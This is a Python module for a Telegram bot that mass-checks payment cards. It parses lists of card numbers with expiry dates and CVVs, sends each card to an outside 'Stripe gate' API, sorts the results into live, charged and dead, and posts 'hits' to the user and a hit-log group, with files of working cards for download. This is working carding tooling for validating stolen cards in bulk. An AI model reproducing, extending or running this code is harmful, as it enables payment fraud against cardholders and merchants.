"""
mst.py — /mst Mass Stripe checker (python-telegram-bot, NO aiogram)

Architecture:
  • CommandHandler("mst", cmd_mst)
  • CallbackQueryHandler for "mstr:<sid>:<type>" (download results)
  • CallbackQueryHandler for "msts:<sid>"         (stop session)

All session state is held in-memory dicts (no database).
"""

import asyncio
import random
import re
import logging
import aiohttp
import time
import string
from datetime import datetime
from typing import Optional, List, Tuple
from io import BytesIO
from html import escape as html_escape

from telegram import Update, InputFile
from telegram.error import BadRequest, Forbidden
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID, CHANNEL_LINK, DEV_LINK, BOT_NAME,
    get_bin_info,
    tg_emoji,
    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID,
    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
    BTN_ALL_EMOJI_ID, BTN_STOP_EMOJI_ID,
    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
    DEV_EMOJI_ID, PRO_EMOJI_ID, HIT_RESP_EMOJI_ID,
    get_random_live_emoji, get_plan_emoji_id,
    RawMarkup, _btn,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HIT_LOG_GROUP_ID         = -1004398328329   # ← set to your hit-log group
EXTRA_CHARGED_GROUP_ID   = -1003991915326   # ← set to your extra-log group
STRIPE_GATE_API_URL      = "https://cardx.up.railway.app/stripe/cc={card}"

MAX_CONCURRENT_CARDS     = 3     # real Stripe gate is slow; 3 parallel avoids hammering
CARD_TIMEOUT_SECONDS     = 120   # give each card up to 2 minutes
PROGRESS_UPDATE_INTERVAL = 10.0  # update every 10s to avoid Telegram flood limits
CARDS_PER_UPDATE         = 5
SESSION_CLEANUP_SECS     = 1800
COMPLETED_KEEP_SECS      = 86400

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# IN-MEMORY USER STORE  (no database / psycopg2)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_CREDITS: dict = {}   # user_id -> int
_PREMIUM: dict = {}   # user_id -> bool

def _credits(uid: int)            -> int:  return _CREDITS.get(uid, 999999)
def _set_credits(uid: int, n: int) -> None: _CREDITS[uid] = max(0, n)
def _is_premium(uid: int)          -> bool: return _PREMIUM.get(uid, True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION STORAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MST_SESSIONS:   dict = {}
MST_COMPLETED:  dict = {}
MST_TASKS:      dict = {}

def _sess(sid: str) -> Optional[dict]:
    return MST_SESSIONS.get(sid) or MST_COMPLETED.get(sid)

def _stopped(sid: str) -> bool:
    s = MST_SESSIONS.get(sid)
    return (not s) or s.get("status") == "STOPPED"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD RESPONSE CLASSIFIER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _classify(resp: str) -> str:
    """
    Classify a raw gate response string.
    Returns: CHARGED | LIVE | DEAD | RETRY | ERROR
    Case-insensitive; handles both upper and lower gate responses.
    """
    mu = resp.upper()
    ml = resp.lower()

    # CHARGED — real money taken
    if any(x in mu for x in (
        "ORDER_PAID", "ORDER PAID", "CHARGED", "CAPTURED",
        "PAYMENT_INTENT.SUCCEEDED", "AMOUNT_CAPTURED",
        "PAYMENT CAPTURED", "CHARGE SUCCEEDED",
        "ORDER PLACED", "ORDER CONFIRMED", "PAYMENT SUCCESSFUL",
    )):
        return "CHARGED"

    # TDS / 3D Secure
    if any(x in mu for x in ("3DS_REQUIRED", "3D_SECURE", "3D SECURE", "THREE_D_SECURE")):
        return "LIVE"   # treat TDS as LIVE in Stripe mass (card is valid)

    # LIVE — card valid but not charged
    if any(x in mu for x in (
        "INSUFFICIENT_FUNDS", "INCORRECT_CVV", "INCORRECT_CVC",
        "INCORRECT_ZIP", "DO_NOT_HONOR", "DO NOT HONOR",
        "APPROVED", "SUCCESS", "AUTHENTICATED",
        "THANK YOU", "AUTHENTICATION SUCCESSFUL",
    )):
        return "LIVE"

    # DEAD — hard decline
    if any(x in mu for x in (
        "DECLINED", "CARD_DECLINED", "GENERIC_DECLINE",
        "PROCESSING_ERROR", "PICK_UP_CARD", "FRAUD_SUSPECTED",
        "STOLEN", "LOST_CARD", "EXPIRED", "RESTRICTED",
        "TRANSACTION_NOT_ALLOWED", "INVALID_CARD",
        "SECURITY_VIOLATION", "CALL_ISSUER", "BLOCKED",
    )):
        return "DEAD"

    # RETRY — infra/proxy/site errors
    if any(x in ml for x in (
        "connection error", "timeout", "socket", "ssl",
        "rate limit", "too many requests", "service unavailable",
        "gateway timeout", "proxy error", "hcaptcha",
    )):
        return "RETRY"

    return "DEAD"   # unknown → treat as dead, not error

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _safe(t) -> str:
    return html_escape(str(t)) if t else "N/A"

def _user_link(user) -> str:
    name = _safe(user.first_name or "User")
    if user.username:
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _luhn(n: str) -> bool:
    if not n.isdigit(): return False
    total = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def _parse_cards(text: str) -> List[Tuple[str,str]]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
    ]
    seen = set(); cards = []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            fmt = f"{cc}|{mm}|{yy}|{cvv}"
            if fmt not in seen and _luhn(cc):
                seen.add(fmt); cards.append((fmt, cc))
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RATE LIMITER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class _RL:
    def __init__(self, interval=1.0, burst=3):
        self._interval = interval; self._burst = burst
        self._last = 0.0; self._cnt = 0; self._reset = 0.0
        self._lock = asyncio.Lock()
    async def wait(self):
        async with self._lock:
            now = time.time()
            if now - self._reset > 5.0:
                self._cnt = 0; self._reset = now
            delay = 2.0 if self._cnt >= self._burst else max(0, self._interval-(now-self._last))
            if delay: await asyncio.sleep(delay)
            self._last = time.time(); self._cnt += 1

_RL_HIT  = _RL(1.0, 3)
_RL_DM   = _RL(1.0, 3)
_RL_PROG = _RL(0.5, 10)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STRIPE API
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _stripe(card: str) -> dict:
    url = STRIPE_GATE_API_URL.format(card=card)
    try:
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=CARD_TIMEOUT_SECONDS)
        ) as s:
            async with s.get(url) as r:
                if r.status == 200:
                    data = await r.json()
                    return {"status": data.get("status","error").lower(),
                            "response": data.get("response","Unknown")}
                return {"status":"error","response":f"HTTP {r.status}"}
    except asyncio.TimeoutError:
        return {"status":"error","response":"Connection Timed Out"}
    except Exception as e:
        return {"status":"error","response":f"Connection Error: {str(e)[:50]}"}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARD BUILDERS  (raw dicts — coloured buttons)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _kb_running(sid: str, checked: int) -> RawMarkup:
    return RawMarkup([
        [_btn(f"All ({checked})", cb=f"mstr:{sid}:all", style="primary", icon=BTN_ALL_EMOJI_ID)],
        [_btn("Stop",             cb=f"msts:{sid}",     style="danger",  icon=BTN_STOP_EMOJI_ID)],
    ])

def _kb_done(sid: str, live: int, dead: int) -> RawMarkup:
    total = live + dead
    row1  = []
    if live:
        row1.append(_btn(f"Live ({live})", cb=f"mstr:{sid}:live", style="primary", icon=BTN_STOP_EMOJI_ID))
    row1.append(_btn(f"All ({total})", cb=f"mstr:{sid}:all", style="primary", icon=BTN_ALL_EMOJI_ID))
    return RawMarkup([row1])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS TEXT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _prog_text(sess: dict) -> str:
    elapsed = time.time() - sess["start_time"]
    ts      = f"{int(elapsed//60)}m {int(elapsed%60)}s" if elapsed >= 60 else f"{int(elapsed)}s"
    ul      = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
    pe      = sess.get("plan_eid", PRO_EMOJI_ID)
    dev_url = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'
    return (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Stripe | 0$</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Live ➳ {sess["live"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>Dead ➳ {sess["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Errors ➳ {sess["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Time ➳ {ts}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ul} '
        f'<tg-emoji emoji-id="{pe}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_url} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

async def _update_progress(bot, sid: str, force=False):
    sess = MST_SESSIONS.get(sid)
    if not sess: return
    now  = time.time()
    if not force and (now - sess.get("last_upd", 0)) < PROGRESS_UPDATE_INTERVAL:
        return
    text = _prog_text(sess)
    if sess.get("last_txt") == text and not force:
        return
    running = sess["status"] == "CHECKING"
    kb      = _kb_running(sid, sess["checked"]) if running else _kb_done(sid, sess["live"], sess["dead"])
    await _RL_PROG.wait()
    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"], message_id=sess["msg_id"],
            text=text, parse_mode="HTML", reply_markup=kb,
            disable_web_page_preview=True,
        )
        sess["last_txt"] = text
        sess["last_upd"] = now
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" not in err and "message to edit not found" not in err:
            logging.error(f"[MST] progress update error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _hit_dm_text(card: str, resp: str, bin_data: dict,
                 elapsed: float, user, plan_eid: str) -> str:
    b = bin_data or {}
    scheme = str(b.get("scheme","N/A")).upper()
    bank   = b.get("bank","N/A")
    co     = b.get("country","N/A")
    fl     = b.get("country_emoji","")
    bi     = _safe(f"{scheme} - {bank} - {fl} {co}".strip(" -"))
    ul     = _user_link(user)
    le     = get_random_live_emoji()
    ts     = f"{int(elapsed//60)}m {int(elapsed%60)}s" if elapsed >= 60 else f"{int(elapsed)}s"
    dev_url = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'
    return (
        f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
        f'<tg-emoji emoji-id="{le}">✅</tg-emoji></b>\n\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{html_escape(card)}</code></b>\n'
        f'<b>Gate ➳ Stripe | 0$</b>\n──────────\n'
        f'<b>Resp ➳ {_safe(resp)}</b>\n'
        f'<b>Bin  ➳ <code>{bi}</code></b>\n──────────\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {ts}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ul} '
        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_url} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

async def _send_hit_notifications(bot, sess: dict, card: str, resp: str,
                                   bin_data: dict, elapsed: float):
    user     = sess.get("user_obj")
    plan_eid = sess.get("plan_eid", PRO_EMOJI_ID)
    plan     = sess.get("plan_name", "ELITE")
    text     = _hit_dm_text(card, resp, bin_data, elapsed, user, plan_eid)

    # DM to user
    await _RL_DM.wait()
    try:
        await bot.send_message(chat_id=user.id, text=text,
                               parse_mode="HTML", disable_web_page_preview=True)
    except (Forbidden, BadRequest) as e:
        logging.warning(f"[MST] DM failed: {e}")
        try:
            await bot.send_message(chat_id=sess["chat_id"], text=text,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

    # Hit-log group
    await _RL_HIT.wait()
    le  = get_random_live_emoji()
    pe  = get_plan_emoji_id(plan)
    ul  = _user_link(user)
    eid = "5839116473951328489"
    hit_msg = (
        f'<b><a href="{CHANNEL_LINK}">[❆]</a> LIVE '
        f'<tg-emoji emoji-id="{le}">✅</tg-emoji></b>\n'
        f'<b>────────────</b>\n'
        f'<b>Stripe • 0$</b>\n'
        f'<b><tg-emoji emoji-id="{eid}">✅</tg-emoji> {_safe(resp)}</b>\n'
        f'<b>────────────</b>\n'
        f'<b>{ul} <tg-emoji emoji-id="{pe}">⭐</tg-emoji></b>'
    )
    try:
        await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=hit_msg,
                               parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[MST] hit-log error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _process_card(bot, sid: str, card_fmt: str, cc: str):
    sess = MST_SESSIONS.get(sid)
    if not sess or _stopped(sid): return

    t0      = time.time()
    bin_data = {}
    try:
        bin_data = await asyncio.wait_for(get_bin_info(cc[:6]), timeout=8)
    except Exception:
        pass

    if _stopped(sid): return

    try:
        result   = await _stripe(card_fmt)
        status   = result.get("status","error").lower()
        resp_txt = result.get("response","Unknown")
    except asyncio.CancelledError:
        raise
    except Exception as e:
        status   = "error"
        resp_txt = str(e)[:80]

    if _stopped(sid): return

    elapsed = time.time() - t0
    verdict = _classify(resp_txt) if status == "approved" else (
        "DEAD" if status == "declined" else "ERROR"
    )
    # override with full classify on the response text
    verdict = _classify(resp_txt)

    card_rec = {"card": card_fmt, "response": resp_txt,
                "status": status, "bin_info": bin_data or {},
                "timestamp": datetime.now().isoformat()}

    sess["checked"] += 1
    if verdict in ("CHARGED", "LIVE"):
        sess["live"]  += 1
        sess.setdefault("live_cards", []).append(card_rec)
        sess.setdefault("dead_cards", [])  # ensure key exists
        if verdict == "CHARGED":
            # deduct 1 credit
            uid = sess.get("user_id")
            if uid:
                _set_credits(uid, _credits(uid) - 1)
        await _send_hit_notifications(bot, sess, card_fmt, resp_txt, bin_data, elapsed)
    elif verdict == "DEAD":
        sess["dead"]  += 1
        sess.setdefault("dead_cards", []).append(card_rec)
        uid = sess.get("user_id")
        if uid:
            _set_credits(uid, _credits(uid) - 1)
    else:  # ERROR / RETRY
        sess["errors"] += 1
        sess.setdefault("error_cards", []).append(card_rec)

    # progress update every N cards or on live hit
    if sess["checked"] % CARDS_PER_UPDATE == 0 or verdict in ("CHARGED","LIVE"):
        try: await _update_progress(bot, sid)
        except Exception: pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECKER RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _run_mass(bot, sid: str, cards: list):
    sess = MST_SESSIONS.get(sid)
    if not sess: return

    sem = asyncio.Semaphore(MAX_CONCURRENT_CARDS)

    async def _worker(fmt, cc):
        if _stopped(sid): return
        async with sem:
            if _stopped(sid): return
            try:
                await _process_card(bot, sid, fmt, cc)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logging.error(f"[MST] worker error {fmt}: {e}")
                s = MST_SESSIONS.get(sid)
                if s: s["errors"] += 1
            # small delay between cards so the gate gets breathing room
            await asyncio.sleep(2)

    tasks = [asyncio.create_task(_worker(fmt, cc)) for fmt, cc in cards]
    MST_TASKS[sid] = tasks
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        sess = MST_SESSIONS.get(sid)
        if sess:
            if sess["status"] != "STOPPED":
                sess["status"] = "FINISHED"
            sess["end_time"] = time.time()
            # move to completed
            MST_COMPLETED[sid] = dict(sess)
            try: await _update_progress(bot, sid, force=True)
            except Exception: pass
        MST_SESSIONS.pop(sid, None)
        MST_TASKS.pop(sid, None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION CLEANUP  (background task)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_cleanup_started = False

async def _cleanup_loop():
    while True:
        try:
            await asyncio.sleep(120)
            now = time.time()
            old = [k for k, v in list(MST_COMPLETED.items())
                   if now - v.get("completed_at", now) > COMPLETED_KEEP_SECS]
            for k in old:
                MST_COMPLETED.pop(k, None)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logging.error(f"[MST] cleanup error: {e}")

def _ensure_cleanup():
    global _cleanup_started
    if not _cleanup_started:
        _cleanup_started = True
        asyncio.create_task(_cleanup_loop())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _result_file(sess: dict, rtype: str) -> Tuple[BytesIO, str, int]:
    if rtype == "live":
        cards = sess.get("live_cards", [])
        label = "Live"
    else:
        cards = (sess.get("live_cards", []) +
                 sess.get("dead_cards", []) +
                 sess.get("error_cards", []))
        label = "All"

    name  = (sess["user_obj"].first_name if sess.get("user_obj") else "User") or "User"
    lines = [f"Gate ➳ Stripe | 0$", f"Result ➳ {label}",
             f"Total ➳ {len(cards)}", "━━━━━━━━━━━━"]
    for c in cards:
        bi  = c.get("bin_info", {})
        sc  = str(bi.get("scheme","N/A")).upper()
        bk  = bi.get("bank","N/A")
        co  = bi.get("country","N/A")
        fl  = bi.get("country_emoji","")
        lines += [
            f"Card ➳ {c['card']}",
            f"Resp ➳ {c.get('response','N/A')}",
            f"Gate ➳ Stripe | 0$",
            f"Brand ➳ {sc}", f"Issuer ➳ {bk}",
            f"Country ➳ {fl} {co}".strip(),
            f"User ➳ {name}", "━━━━━━━━━━━━",
        ]
    buf = BytesIO("\n".join(lines).encode())
    buf.seek(0)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn   = f"Batamanchk_MST_{label.upper()}_{ts}.txt"
    return buf, fn, len(cards)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /mst COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_mst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid  = user.id
    bot  = context.bot

    if not _is_premium(uid):
        await update.message.reply_text(
            f"{E_CHARGED} <b>Premium required for /mst.</b>\n"
            "Contact the owner to upgrade.",
            parse_mode="HTML"
        )
        return

    _ensure_cleanup()

    # ── Block if already running ────────────────────────────────────
    for sid, sd in list(MST_SESSIONS.items()):
        if sd.get("user_id") == uid and sd.get("status") == "CHECKING":
            await update.message.reply_text(
                f"{E_ERRORS} <b>You already have an active /mst session.</b>\n"
                "Use the Stop button to cancel it first.",
                parse_mode="HTML"
            )
            return

    # ── Collect cards ────────────────────────────────────────────────
    raw = ""
    msg = update.message
    if context.args:
        raw += " ".join(context.args) + " "
    if msg.reply_to_message:
        rm = msg.reply_to_message
        raw += (rm.text or rm.caption or "") + " "

    doc = msg.document or (msg.reply_to_message.document if msg.reply_to_message else None)
    if doc:
        if doc.file_size > 3 * 1024 * 1024:
            await msg.reply_text("File too large (max 3 MB)."); return
        try:
            f    = await doc.get_file()
            data = await f.download_as_bytearray()
            raw += data.decode("utf-8", errors="ignore")
        except Exception as e:
            await msg.reply_text(f"Error reading file: {e}"); return

    if not raw.strip():
        await msg.reply_text(
            f'<b>{E_GATE} Mass Stripe — <code>/mst</code></b>\n──────────\n'
            f'Reply to a <code>.txt</code> file or paste cards directly.\n'
            f'Format: <code>cc|mm|yy|cvv</code> (one per line)',
            parse_mode="HTML"
        ); return

    cards = _parse_cards(raw)
    if not cards:
        await msg.reply_text(f"{E_DECLINED} No valid cards found (use <code>cc|mm|yy|cvv</code>).",
                             parse_mode="HTML"); return
    if len(cards) > 20000:
        cards = cards[:20000]

    total    = len(cards)
    sid      = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    plan_eid = get_plan_emoji_id("ELITE")
    ul       = _user_link(user)
    dev_url  = f'<a href="{DEV_LINK}">{bot_name_from_config()}</a>'

    init_text = (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Stripe | 0$</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ 0/{total}</b>\n'
        f'<b>Live ➳ 0 <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>Dead ➳ 0 <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Errors ➳ 0 <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Time ➳ 0s</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ul} '
        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_url} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

    prog_msg = await msg.reply_text(
        init_text, parse_mode="HTML",
        reply_markup=_kb_running(sid, 0),
        disable_web_page_preview=True,
    )

    MST_SESSIONS[sid] = {
        "status":     "CHECKING",
        "chat_id":    msg.chat.id,
        "user_id":    uid,
        "msg_id":     prog_msg.message_id,
        "total":      total,
        "checked":    0,
        "live":       0,
        "dead":       0,
        "errors":     0,
        "start_time": time.time(),
        "end_time":   None,
        "last_txt":   "",
        "last_upd":   0,
        "live_cards": [],
        "dead_cards": [],
        "error_cards":[],
        "user_obj":   user,
        "plan_name":  "ELITE",
        "plan_eid":   plan_eid,
        "completed_at": None,
    }

    asyncio.create_task(_run_mass(bot, sid, cards))

def bot_name_from_config():
    try: return BOT_NAME
    except: return "Batamanchk"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK: download results
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_mst_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    parts = query.data.split(":")   # mstr:<sid>:<type>
    if len(parts) < 3:
        return
    _, sid, rtype = parts[0], parts[1], parts[2]
    sess = _sess(sid)
    if not sess:
        await query.answer("Session not found.", show_alert=True); return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("Not your session.", show_alert=True); return

    buf, fn, count = _result_file(sess, rtype)
    if count == 0:
        await query.answer(f"No {rtype} cards yet.", show_alert=True); return

    await query.answer("Generating…")
    try:
        await context.bot.send_document(
            chat_id=query.message.chat.id,
            document=InputFile(buf, filename=fn),
            caption=f"Gate ➳ Stripe | 0$\nType ➳ {rtype.capitalize()}\nTotal ➳ {count}",
            parse_mode="HTML",
        )
    except Exception as e:
        logging.error(f"[MST] send_document error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK: stop session
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_mst_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    sid   = query.data.split(":")[-1]   # msts:<sid>
    sess  = MST_SESSIONS.get(sid)
    if not sess:
        await query.answer("Session already finished.", show_alert=True); return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("Not your session.", show_alert=True); return
    if sess["status"] != "CHECKING":
        await query.answer("Not running.", show_alert=True); return

    sess["status"] = "STOPPED"
    for t in MST_TASKS.get(sid, []):
        if not t.done(): t.cancel()
    await query.answer("Stopped.")
    try:
        await _update_progress(context.bot, sid, force=True)
    except Exception:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HANDLER EXPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_mst_handlers():
    return [
        CommandHandler("mst",         cmd_mst),
        CallbackQueryHandler(cb_mst_result, pattern=r"^mstr:"),
        CallbackQueryHandler(cb_mst_stop,   pattern=r"^msts:"),
    ]
